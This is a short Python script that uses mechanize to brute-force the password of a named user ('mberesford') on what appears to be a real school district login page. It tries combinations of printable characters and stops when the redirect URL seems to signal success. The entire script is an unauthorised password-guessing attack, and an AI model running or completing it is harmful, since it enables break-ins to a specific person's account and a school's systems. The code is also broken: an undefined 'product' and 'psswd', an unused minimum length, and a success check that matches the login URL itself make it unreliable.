import mechanize 
import itertools
import string
br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
min_len = int(input("Enter minimum password length"))
max_len = int(input("Enter maximum password length"))
counter = 0
charater = string.printable

for i in range(max_len,max_len+1):
    for j in product(charater,repeat=i):
        word = "".join(j)
combos = psswd 
br.open("http://ckm.ccs.k12.in.us/cgi-bin/ck/domenu.cgi;")
for x in combos:	
	br.select_form( nr = 0 )
	br.form['userName'] = "mberesford"
	br.form['password'] = ''.join(x)
	print("Checking ",br.form['password'])
	response=br.submit()
	if response.geturl()=="http://ckm.ccs.k12.in.us/cgi-bin/ck/domenu.cgi;":
		#url to which the page is redirected after login
		print("Correct password is ",''.join(x))
		break